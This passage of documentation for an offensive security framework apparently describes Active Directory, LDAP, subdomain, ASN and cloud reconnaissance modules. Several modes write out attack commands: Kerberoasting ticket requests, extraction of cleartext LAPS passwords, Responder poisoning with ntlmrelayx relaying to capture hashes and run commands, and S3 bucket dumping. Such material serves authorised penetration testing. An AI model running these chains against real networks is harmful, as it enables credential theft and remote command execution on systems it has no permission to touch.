**ID:** `recon-ad-users` | **Risk:** MEDIUM | **File:** `ADUserEnumeratorModule.java`
**Tools:** `ldapsearch`, `rpcclient`, `nmap`, `dig`, `kerbrute`, `bloodhound-python`

#### Execution Modes:

- **`ENUM`** (Short Name: `ENUM`)
    - **Purpose**: Comprehensive user discovery across multiple protocols.
    - **Input Schema**: `{ dc: String, domain: String, base_dn: String }`
    - **Multi-Tool Command Logic**:
        1. `ldapsearch -x -H ldap://<dc> -b <base_dn> "(objectClass=user)"` (LDAP User List)
        2. `rpcclient -U "" -N -c "enumdomusers" <dc>` (RPC User Probe)
        3. `kerbrute userenum --dc <dc> -d <domain> /usr/share/wordlists/users.txt` (Kerberos Enum)
        4. `nmap -p 88,389,445 <dc>` (Service Check)
        5. `dig <domain> ANY` (DNS Context)
    - **Execution Flow**: LDAP -> RPC -> Kerberos -> Service Check -> DNS.
    - **Output Generation & Artifacts**:
        - `reports/outputs/ENUM_[Timestamp]_discovered_users.json`: List of AD users discovered via LDAP, RPC, and Kerberos.
        - `reports/artifacts/ENUM_[Timestamp]_kerbrute_results.txt`: Raw output from Kerberos user enumeration.
        - `reports/analysis/ENUM_[Timestamp]_service_map.json`: Status of AD-related services (LDAP, Kerberos, SMB).

- **`DEEP`** (Short Name: `DEEP`)
    - **Purpose**: Full attribute extraction and identity mapping.
    - **Input Schema**: `{ dc: String, user: String, pass: Password, base_dn: String }`
    - **Multi-Tool Command Logic**:
        1. `ldapsearch -x -H ldap://<dc> -D <user> -w <pass> -b <base_dn> "(&(objectClass=user)(objectCategory=person))"` (Full Attributes)
        2. `bloodhound-python -u <user> -p <pass> -d <domain> -dc <dc> -c Users` (Graph Data)
        3. `rpcclient -U "<user>%<pass>" -c "querydispinfo" <dc>` (Display Info)
        4. `nmap -sV -p 389,636 <dc>` (LDAP Versioning)
        5. `dig -x <dc>` (Reverse Resolution)
    - **Execution Flow**: LDAP Attributes -> Graph Data -> Display Info -> Versioning -> Resolution.
    - **Output Generation & Artifacts**:
        - `reports/outputs/DEEP_[Timestamp]_full_user_attributes.json`: Comprehensive LDAP attribute dump for all users.
        - `reports/artifacts/DEEP_[Timestamp]_bloodhound_data.zip`: Collected graph data for BloodHound ingestion.
        - `reports/analysis/DEEP_[Timestamp]_display_info.txt`: RPC display info and identity mapping.

---

### 12. AD Delegation Discovery
**ID:** `recon-ad-delegation` | **Risk:** MEDIUM | **File:** `ADDelegationDiscoveryModule.java`
**Tools:** `ldapsearch`, `rpcclient`, `nmap`, `dig`, `bloodhound-python`, `GetUserSPNs.py`

#### Execution Modes:

- **`QUERY`** (Short Name: `QUERY`)
    - **Purpose**: Identify delegation-enabled accounts and SPNs.
    - **Input Schema**: `{ dc: String, domain: String, base_dn: String, user: String, pass: Password }`
    - **Multi-Tool Command Logic**:
        1. `ldapsearch -x -H ldap://<dc> -D <user> -w <pass> -b <base_dn> "(userAccountControl:1.2.840.113556.1.4.803:=524288)"` (Unconstrained)
        2. `GetUserSPNs.py -dc-ip <dc> <domain>/<user>:<pass> -request` (Kerberoasting)
        3. `rpcclient -U "<user>%<pass>" -c "dsroledominfo" <dc>` (Domain Role)
        4. `nmap -p 88 <dc>` (Kerberos Probe)
        5. `dig -t SRV _kerberos._tcp.<domain>` (KDC Discovery)
    - **Execution Flow**: LDAP Query -> SPN Roasting -> Domain Role -> Port Probe -> KDC Discovery.
    - **Output Generation & Artifacts**:
        - `reports/outputs/QUERY_[Timestamp]_delegation_accounts.json`: List of accounts with delegation enabled.
        - `reports/payloads/QUERY_[Timestamp]_kerberoast_tickets.kirbi`: Exported Kerberos tickets for SPN accounts.
        - `reports/analysis/QUERY_[Timestamp]_kdc_discovery.json`: DNS and port verification of Kerberos Key Distribution Centers.

- **`GRAPH`** (Short Name: `GRAPH`)
    - **Purpose**: Map delegation paths for complex attack chain analysis.
    - **Input Schema**: `{ domain: String, user: String, pass: Password, dc: String }`
    - **Multi-Tool Command Logic**:
        1. `bloodhound-python -u <user> -p <pass> -d <domain> -dc <dc> -c Delegation` (Graph Collection)
        2. `ldapsearch -x -H ldap://<dc> -D <user> -w <pass> -b <base_dn> "(msDS-AllowedToDelegateTo=*)"` (Constrained)
        3. `rpcclient -U "<user>%<pass>" -c "enumprivs" <dc>` (Privilege Check)
        4. `nmap -sS -p 389 <dc>` (Stealth Probe)
        5. `dig <domain> SOA` (SOA Check)
    - **Execution Flow**: Graph Collection -> LDAP Constrained -> RPC Privs -> Stealth Probe -> SOA Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/GRAPH_[Timestamp]_constrained_delegation.json`: Detailed mapping of constrained delegation paths.
        - `reports/artifacts/GRAPH_[Timestamp]_bloodhound_delegation.zip`: Collected graph data focused on delegation.
        - `reports/analysis/GRAPH_[Timestamp]_privilege_audit.txt`: Audit of RPC privileges for the collection account.

---

### 13. AD LAPS Password
**ID:** `recon-ad-laps` | **Risk:** HIGH | **File:** `adlaps/ADLAPSPasswordModule.java`
**Tools:** `ldapsearch`, `rpcclient`, `nmap`, `dig`, `crackmapexec`

#### Execution Modes:

- **`EXTRACT`** (Short Name: `EXTRACT`)
    - **Purpose**: Identify LAPS configuration and extract cleartext passwords.
    - **Input Schema**: `{ dc: String, domain: String, user: String, pass: Password, base_dn: String }`
    - **Multi-Tool Command Logic**:
        1. `ldapsearch -x -H ldap://<dc> -D <user> -w <pass> -b <base_dn> "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd` (Attribute Extract)
        2. `rpcclient -U "<user>%<pass>" -c "querydispinfo" <dc>` (Account Mapping)
        3. `crackmapexec smb <dc> -u <user> -p <pass> --laps` (CME LAPS Check)
        4. `nmap -p 445 --script smb-os-discovery <dc>` (Target Discovery)
        5. `dig -t A <dc>` (Host Mapping)
    - **Execution Flow**: Attribute Extract -> Account Mapping -> CME Check -> Target Discovery -> Host Mapping.
    - **Output Generation & Artifacts**:
        - `reports/outputs/EXTRACT_[Timestamp]_laps_passwords.json`: Extracted cleartext passwords and expiration dates.
        - `reports/artifacts/EXTRACT_[Timestamp]_ldap_raw.txt`: Raw LDAP attribute dump.
        - `reports/analysis/EXTRACT_[Timestamp]_smb_discovery.json`: SMB security mode and OS info.

- **`VAL`** (Short Name: `VAL`)
    - **Purpose**: Validate extracted LAPS credentials against the target range.
    - **Input Schema**: `{ target_range: String, laps_user: String, laps_pass: String, dc: String }`
    - **Multi-Tool Command Logic**:
        1. `crackmapexec smb <target_range> -u <laps_user> -p <laps_pass>` (Range Validation)
        2. `nmap -sn <target_range>` (Liveness Check)
        3. `rpcclient -U "<laps_user>%<laps_pass>" -c "getusername" <dc>` (Credential Check)
        4. `ldapsearch -x -H ldap://<dc> -D <laps_user> -w <laps_pass> -b "" -s base` (RootDSE Probe)
        5. `dig -x <dc>` (PTR Verification)
    - **Execution Flow**: Range Validation -> Liveness -> Cred Check -> RootDSE Probe -> PTR Verification.
    - **Output Generation & Artifacts**:
        - `reports/outputs/VAL_[Timestamp]_credential_validation.json`: Results of testing LAPS credentials against the target range.
        - `reports/artifacts/VAL_[Timestamp]_rpc_check.txt`: Log of RPC identity verification using LAPS credentials.
        - `reports/analysis/VAL_[Timestamp]_liveness_map.txt`: Liveness status of targets in the validated range.

---

### 14. SPN Enumerator
**ID:** `recon-spn-enum` | **Risk:** MEDIUM | **File:** `SPNEnumeratorModule.java`
**Tools:** `ldapsearch`, `rpcclient`, `nmap`, `dig`, `GetUserSPNs.py`

#### Execution Modes:

- **`ROST`** (Short Name: `ROST`)
    - **Purpose**: Discover SPNs and request Kerberoasting tickets.
    - **Input Schema**: `{ dc: String, domain: String, user: String, pass: Password, base_dn: String }`
    - **Multi-Tool Command Logic**:
        1. `GetUserSPNs.py -dc-ip <dc> <domain>/<user>:<pass> -request` (Ticket Request)
        2. `ldapsearch -x -H ldap://<dc> -D <user> -w <pass> -b <base_dn> "(&(servicePrincipalName=*)(objectClass=user))"` (SPN Audit)
        3. `rpcclient -U "<user>%<pass>" -c "dsroledominfo" <dc>` (Infrastructure Check)
        4. `nmap -p 88 <dc>` (Kerberos Port Check)
        5. `dig -t SRV _kerberos._tcp.<domain>` (KDC Location)
    - **Execution Flow**: Ticket Request -> SPN Audit -> Infra Check -> Port Check -> KDC Location.
    - **Output Generation & Artifacts**:
        - `reports/payloads/ROAST_[Timestamp]_kerberoast_tickets.kirbi`: Exported Kerberos tickets for offline cracking.
        - `reports/outputs/ROAST_[Timestamp]_spn_map.json`: Comprehensive mapping of SPNs to accounts.
        - `reports/artifacts/ROAST_[Timestamp]_dns_srv.txt`: KDC SRV records.

- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Passive audit of SPN configuration and account security.
    - **Input Schema**: `{ dc: String, domain: String, base_dn: String }`
    - **Multi-Tool Command Logic**:
        1. `ldapsearch -x -H ldap://<dc> -b <base_dn> "(servicePrincipalName=*)" servicePrincipalName sAMAccountName` (Quick Map)
        2. `dig -t ANY <domain>` (DNS Zone Context)
        3. `rpcclient -U "" -N -c "srvinfo" <dc>` (Server Info)
        4. `nmap -sn <dc>` (Host Status)
        5. `GetUserSPNs.py -dc-ip <dc> <domain>/ -users-file users.txt` (Candidate Search)
    - **Execution Flow**: Quick Map -> DNS Context -> Server Info -> Host Status -> Candidate Search.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_spn_audit.json`: Detailed audit of discovered SPNs and associated accounts.
        - `reports/artifacts/AUDIT_[Timestamp]_dns_zone.txt`: DNS zone information related to the domain.
        - `reports/analysis/AUDIT_[Timestamp]_server_status.json`: Status and information of the targeted domain controllers.

---

### 15. LDAP Status Checker
**ID:** `recon-ldap-status` | **Risk:** LOW | **File:** `LDAPStatusCheckerModule.java`
**Tools:** `nmap`, `ldapsearch`, `dig`, `openssl`, `nc`

#### Execution Modes:

- **`SECURITY`** (Short Name: `SECURITY`)
    - **Purpose**: Deep audit of LDAP security controls and configuration.
    - **Input Schema**: `{ target: String, port: int }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p <port> --script ldap-rootdse,ldap-search,ldap-capability <target>` (Nmap Audit)
        2. `ldapsearch -x -H ldap://<target>:<port> -b "" -s base` (RootDSE Extraction)
        3. `openssl s_client -connect <target>:<port> -showcerts` (TLS Audit)
        4. `nc -zv <target> <port>` (Port Readiness)
        5. `dig -x <target>` (Reverse Resolution)
    - **Execution Flow**: Nmap Audit -> RootDSE -> TLS Audit -> Port Readiness -> Reverse Resolution.
    - **Output Generation & Artifacts**:
        - `reports/analysis/SECURITY_[Timestamp]_ldap_audit.json`: Detailed security configuration report.
        - `reports/artifacts/SECURITY_[Timestamp]_tls_certs.txt`: Exported LDAP TLS certificates.
        - `reports/outputs/SECURITY_[Timestamp]_rootdse.json`: Extracted RootDSE attributes.

- **`SRVY`** (Short Name: `SRVY`)
    - **Purpose**: Fast discovery of LDAP service availability and capabilities.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 389,636,3268,3269 <target>` (Port Scan)
        2. `ldapsearch -x -H ldap://<target> -b "" -s base namingContexts` (Naming Contexts)
        3. `dig -t SRV _ldap._tcp.<target>` (SRV Resolution)
        4. `nc -z <target> 389` (Quick Probe)
        5. `openssl s_client -connect <target>:636 -quiet < /dev/null` (TLS Probe)
    - **Execution Flow**: Port Scan -> Naming Contexts -> SRV Resolution -> Quick Probe -> TLS Probe.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SURVEY_[Timestamp]_ldap_survey.json`: Results of the LDAP service availability and capability survey.
        - `reports/artifacts/SURVEY_[Timestamp]_srv_resolution.txt`: Discovered LDAP SRV records.
        - `reports/analysis/SURVEY_[Timestamp]_naming_contexts.json`: List of naming contexts supported by the LDAP server.

---

### 16. NTLM Relay Attack
**ID:** `recon-ntlm-relay` | **Risk:** HIGH | **File:** `NTLMRelayAttackModule.java`
**Tools:** `nmap`, `responder`, `ntlmrelayx.py`, `nbtscan`, `crackmapexec`

#### Execution Modes:

- **`SRVY`** (Short Name: `SRVY`)
    - **Purpose**: Identify relayable targets and network vulnerabilities.
    - **Input Schema**: `{ cidr: String, interface: String }`
    - **Multi-Tool Command Logic**:
        1. `crackmapexec smb <cidr> --gen-relay-list relay.txt` (Signing Check)
        2. `nmap -p 445 --script smb2-security-mode <cidr>` (Security Audit)
        3. `nbtscan <cidr>` (NetBIOS Context)
        4. `responder -I <interface> -A` (Passive Analysis)
        5. `ntlmrelayx.py -tf relay.txt -wh <attacker_ip> -smb2support` (Probe)
    - **Execution Flow**: Signing Check -> Security Audit -> NetBIOS Context -> Passive Analysis -> Relay Probe.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SURVEY_[Timestamp]_relay_targets.txt`: List of targets with SMB signing disabled.
        - `reports/artifacts/SURVEY_[Timestamp]_nbt_context.json`: NetBIOS and network context for relaying.
        - `reports/analysis/SURVEY_[Timestamp]_smb_security.json`: Detailed SMB security mode scan results.

- **`ATCK`** (Short Name: `ATCK`)
    - **Purpose**: Execute NTLM relay to capture hashes or execute commands.
    - **Input Schema**: `{ target_list: Path, interface: String, command: String }`
    - **Multi-Tool Command Logic**:
        1. `ntlmrelayx.py -tf <target_list> -c "<command>" -smb2support` (Primary Relay)
        2. `responder -I <interface> -rdv -v` (Poisoning)
        3. `crackmapexec smb <target_list> -u guest -p ""` (Guest Access Check)
        4. `nmap -sn -iL <target_list>` (Host Verification)
        5. `nbtscan -f <target_list>` (Name Resolution)
    - **Execution Flow**: Relay + Poisoning (Parallel) -> Access Check -> Verification -> Name Resolution.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/ATTACK_[Timestamp]_poisoning_logs.txt`: Responder/ntlmrelayx interaction logs.
        - `reports/payloads/ATTACK_[Timestamp]_captured_hashes.txt`: Captured NTLM hashes.
        - `reports/outputs/ATTACK_[Timestamp]_command_output.txt`: Result of executed commands on relayed sessions.

---
### 17. Subdomain Discovery
**ID:** `recon-subdomain` | **Risk:** LOW | **File:** `SubdomainDiscoveryModule.java`
**Tools:** `subfinder`, `assetfinder`, `amass`, `dnsx`, `httpx`

#### Execution Modes:
- **`PASS`** (Short Name: `PASS`)
    - **Purpose**: Fast, stealthy subdomain discovery using public data sources.
    - **Input Schema**: `{ domain: String }`
    - **Multi-Tool Command Logic**:
        1. `subfinder -d <domain> -silent` (Primary Discovery)
        2. `assetfinder --subs-only <domain>` (Secondary Discovery)
        3. `dnsx -d <domain> -a -resp -silent` (Validation)
    - **Execution Flow**: Subfinder -> Assetfinder -> dnsx Validation.
- **`ACTV`** (Short Name: `ACTV`)
    - **Purpose**: Exhaustive subdomain enumeration including brute-forcing and permutations.
    - **Input Schema**: `{ domain: String, wordlist: Path }`
    - **Multi-Tool Command Logic**:
        1. `amass enum -d <domain> -w <wordlist> -active` (Deep Discovery)
        2. `dnsx -d <domain> -w <wordlist> -brute` (Brute Force)
        3. `httpx -l subs.txt -status-code -title` (Asset Verification)
    - **Execution Flow**: Amass -> dnsx Brute -> httpx Verification.

---

### 18. ASNReconModule
**ID:** `recon-asn` | **Risk:** LOW | **File:** `ASNReconModule.java`
**Tools:** `whois`, `dig`, `nmap`, `masscan`, `httpx`

#### Execution Modes:
- **`MAP`** (Short Name: `MAP`)
    - **Purpose**: Identify all IP ranges and CIDRs associated with an Autonomous System Number (ASN).
    - **Input Schema**: `{ asn: String }`
    - **Multi-Tool Command Logic**:
        1. `whois -h whois.radb.net -- "-i origin <asn>"` (Range Extraction)
        2. `nmap -sL -n <cidr_list>` (Reverse Mapping)
        3. `dig -x <ip>` (PTR Validation)
    - **Execution Flow**: Radb Whois -> Reverse Mapping -> PTR Validation.
- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: High-level security audit of all live assets within an ASN.
    - **Input Schema**: `{ asn: String }`
    - **Multi-Tool Command Logic**:
        1. `masscan --asn <asn> --top-ports 100` (Fast Scan)
        2. `httpx -l live_ips.txt -title -tech-detect` (Fingerprinting)
        3. `whois <asn>` (Ownership Audit)
    - **Execution Flow**: Masscan -> httpx Fingerprinting -> Ownership.

---

### 19. CloudAssetReconModule
**ID:** `recon-cloud` | **Risk:** LOW | **File:** `CloudAssetReconModule.java`
**Tools:** `cloudenum`, `s3scanner`, `dig`, `httpx`, `dnsx`

#### Execution Modes:
- **`SRVY`** (Short Name: `SRVY`)
    - **Purpose**: Discover publicly accessible cloud assets (S3 buckets, Azure blobs, etc.) for a keyword.
    - **Input Schema**: `{ keyword: String }`
    - **Multi-Tool Command Logic**:
        1. `cloudenum -k <keyword>` (Core Discovery)
        2. `s3scanner scan <keyword>` (Bucket Audit)
        3. `dig <keyword>.s3.amazonaws.com` (DNS Check)
    - **Execution Flow**: Cloudenum -> S3Scanner -> DNS Check.
- **`DEEP`** (Short Name: `DEEP`)
    - **Purpose**: Exhaustive analysis of cloud infrastructure and permissions.
    - **Input Schema**: `{ domain: String }`
    - **Multi-Tool Command Logic**:
        1. `dnsx -d <domain> -cname` (CNAME Discovery)
        2. `httpx -l subs.txt -path /buckets/` (Path Probing)
        3. `s3scanner dump <bucket_name>` (Asset Extraction)
    - **Execution Flow**: CNAME Discovery -> Path Probing -> Bucket Dumping.

---

**© 2026 Funbinet Inc. — JABBER V 5.5.0.0**
